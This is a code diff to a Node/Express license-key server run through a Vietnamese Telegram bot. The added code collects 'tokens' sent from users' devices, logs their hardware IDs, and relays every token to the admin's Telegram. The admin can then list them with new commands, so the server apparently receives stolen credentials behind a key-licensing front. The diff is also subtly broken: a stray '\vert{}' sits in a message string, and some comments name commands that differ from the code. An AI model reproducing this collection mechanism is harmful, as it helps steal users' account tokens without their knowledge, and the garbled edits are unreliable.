@@ -15,6 +15,10 @@ app.use(express.json());
 // Structure: validKeys[key] = { expireAt: timestamp, deviceId: "mã-máy-đầu-tiên" }
 let validKeys = {};
 
+// Quản lý người dùng & dữ liệu thu thập
+let userDevices = {};   // Structure: userDevices[deviceId] = { firstSeen, lastSeen, keyUsed }
+let collectedTokens = []; // Danh sách lưu trữ tất cả token thu thập được
+
 // --- TRẠNG THÁI BẢO TRÌ TỪ XA ---
 let isMaintenanceMode = false; 
 let maintenanceMsg = "HỆ THỐNG ĐANG BẢO TRÌ TỪ XA!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";
@@ -76,7 +80,7 @@ function handleCommand(msg) {
         return sendMessage(chatId, "👋 Chào mừng! Nhắn `/getkey` để nhận Key dùng thử 24h.");
     }
     
-    if (cmd === '/getkey') {
+    if (cmd === '/bothi') {
         const newKey = generateRandomKey('FREE');
         validKeys[newKey] = { expireAt: Date.now() + (24 * 60 * 60 * 1000), deviceId: null };
         return sendMessage(chatId, `🎉 *Tạo Key Miễn Phí Thành Công!*\n🔑 Key: \`${newKey}\`\n⏳ Hạn dùng: 24 Giờ\n🔒 *Lưu ý:* Key chỉ kích hoạt được trên 1 thiết bị!`);
@@ -85,8 +89,8 @@ function handleCommand(msg) {
     // --- BỘ LỆNH ADMIN ---
     if (chatId !== ADMIN_ID) return;
 
-    // 1. Tạo Key tùy chỉnh: /createkey <TÊN_KEY> <SỐ_GIỜ>
-    if (cmd === '/createkey') {
+    // 1. Tạo Key tùy chỉnh: /taokey <TÊN_KEY> <SỐ_GIỜ>
+    if (cmd === '/taokey') {
         const customKey = args[1];
         const hours = parseInt(args[2]) || 24;
 
@@ -98,7 +102,7 @@ function handleCommand(msg) {
         return sendMessage(chatId, `👑 *ADMIN TẠO KEY THÀNH CÔNG*\n🔑 Key: \`${customKey}\`\n⏱ Thời hạn: ${hours} Giờ`);
     }
 
-    // 2. Tạo Key ngẫu nhiên: /genkey <SỐ_GIỜ>
+    // 2. Tạo Key ngẫu nhiên: /keyfree <SỐ_GIỜ>
     if (cmd === '/genkey') {
         const hours = parseInt(args[1]) || 24;
         const newKey = generateRandomKey('ADMIN');
@@ -118,7 +122,7 @@ function handleCommand(msg) {
     }
 
     // 4. Danh sách key: /listkey
-    if (cmd === '/listkey') {
+    if (cmd === '/keydangdung') {
         const keys = Object.keys(validKeys);
         if (keys.length === 0) return sendMessage(chatId, "📋 Chưa có Key nào.");
 
@@ -127,13 +131,13 @@ function handleCommand(msg) {
         keys.forEach(k => {
             const timeLeft = Math.max(0, Math.round((validKeys[k].expireAt - now) / (1000 * 60)));
             const devStatus = validKeys[k].deviceId ? "🔒 Đã gắn máy" : "🔓 Chưa gắn máy";
-            msgText += `• \`${k}\`: Còn ${timeLeft} phút | ${devStatus}\n`;
+            msgText += `• \`${k}\`: Còn ${timeLeft} phút \vert{} ${devStatus}\n`;
         });
         return sendMessage(chatId, msgText);
     }
 
     // 5. Xóa key: /delkey <KEY>
-    if (cmd === '/delkey') {
+    if (cmd === '/xoakey') {
         const keyToDel = args[1];
         if (validKeys[keyToDel]) {
             delete validKeys[keyToDel];
@@ -159,6 +163,36 @@ function handleCommand(msg) {
             return sendMessage(chatId, `⚠️ Cú pháp: \`/baotri on <LÝ_DO>\` hoặc \`/baotri off\`\n📊 Trạng thái hiện tại: *${statusStr}*`);
         }
     }
+
+    // 7. Xem thống kê hệ thống: /stats
+    if (cmd === '/stats') {
+        const totalUsers = Object.keys(userDevices).length;
+        const totalKeys = Object.keys(validKeys).length;
+        const activeKeys = Object.values(validKeys).filter(k => k.expireAt > Date.now()).length;
+        const totalTokens = collectedTokens.length;
+
+        const statsMsg = `📊 *BÁO CÁO THỐNG KÊ HỆ THỐNG*\n\n` +
+            `📱 *Tổng thiết bị/người dùng (HWID):* \`${totalUsers}\`\n` +
+            `🔑 *Tổng số Key đang tạo:* \`${totalKeys}\`\n` +
+            `🟢 *Key đang hoạt động:* \`${activeKeys}\`\n` +
+            `📥 *Tổng Token thu thập được:* \`${totalTokens}\`\n` +
+            `🛠️ *Trạng thái bảo trì:* ${isMaintenanceMode ? "🔴 ĐANG BẢO TRÌ" : "🟢 ĐANG HOẠT ĐỘNG"}`;
+
+        return sendMessage(chatId, statsMsg);
+    }
+
+    // 8. Xem danh sách Token đã thu thập: /listtokens
+    if (cmd === '/checktoken') {
+        if (collectedTokens.length === 0) {
+            return sendMessage(chatId, "📭 Chưa thu thập được Token nào.");
+        }
+
+        let tokenListText = `📋 *DANH SÁCH ${collectedTokens.length} TOKEN THU THẬP ĐƯỢC:*\n\n`;
+        collectedTokens.forEach((tk, idx) => {
+            tokenListText += `${idx + 1}. \`${tk}\`\n`;
+        });
+        return sendMessage(chatId, tokenListText);
+    }
 }
 
 // --- API KIỂM TRA TRẠNG THÁI BẢO TRÌ TỪ XA ---
@@ -166,6 +200,48 @@ app.get('/api/status', (req, res) => {
     return res.json({
         isMaintenance: isMaintenanceMode,
         message: maintenanceMsg
+    });
+});
+
+// --- API LƯU TOKEN VÀ TỰ ĐỘNG GỬI BÁO VỀ TELEGRAM ADMIN ---
+app.post('/api/save-tokens', async (req, res) => {
+    const { key, deviceId, tokens } = req.body;
+
+    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
+        return res.json({ success: false, message: 'Danh sách Token trống!' });
+    }
+
+    let newlyAdded = 0;
+    tokens.forEach(tk => {
+        if (!collectedTokens.includes(tk)) {
+            collectedTokens.push(tk);
+            newlyAdded++;
+        }
+    });
+
+    // Cập nhật/ghi nhận thiết bị người dùng
+    if (deviceId) {
+        if (!userDevices[deviceId]) {
+            userDevices[deviceId] = { firstSeen: Date.now(), lastSeen: Date.now(), keyUsed: key || 'Chưa đăng nhập' };
+        } else {
+            userDevices[deviceId].lastSeen = Date.now();
+            if (key) userDevices[deviceId].keyUsed = key;
+        }
+    }
+
+    // Gửi thông báo trực tiếp đến Telegram Admin
+    const tokenFormatted = tokens.map((t, idx) => `${idx + 1}. \`${t}\``).join('\n');
+    const alertText = `📥 *CÓ TOKEN MỚI ĐƯỢC LƯU!\n\n` +
+        `🔑 *Key sử dụng:* \`${key || 'Chưa đăng nhập'}\`\n` +
+        `📱 *HWID:* \`${deviceId || 'Không rõ'}\`\n` +
+        `📊 *Số lượng:* ${tokens.length} token (Thêm mới: ${newlyAdded})\n\n` +
+        `📜 *Danh sách Token:*\n${tokenFormatted}`;
+
+    await sendMessage(ADMIN_ID, alertText);
+
+    return res.json({
+        success: true,
+        message: '✅ Đã lưu và gửi Token về Server thành công!'
     });
 });
 
@@ -199,6 +275,16 @@ app.get('/api/verify', (req, res) => {
     } else if (validKeys[key].deviceId !== deviceId) {
         // Đã kích hoạt trên thiết bị khác
         return res.json({ success: false, message: '🚫 Key này đã được sử dụng trên thiết bị khác!' });
+    }
+
+    // Lưu vết người dùng
+    if (deviceId) {
+        if (!userDevices[deviceId]) {
+            userDevices[deviceId] = { firstSeen: Date.now(), lastSeen: Date.now(), keyUsed: key };
+        } else {
+            userDevices[deviceId].lastSeen = Date.now();
+            userDevices[deviceId].keyUsed = key;
+        }
     }
 
     return res.json({ 
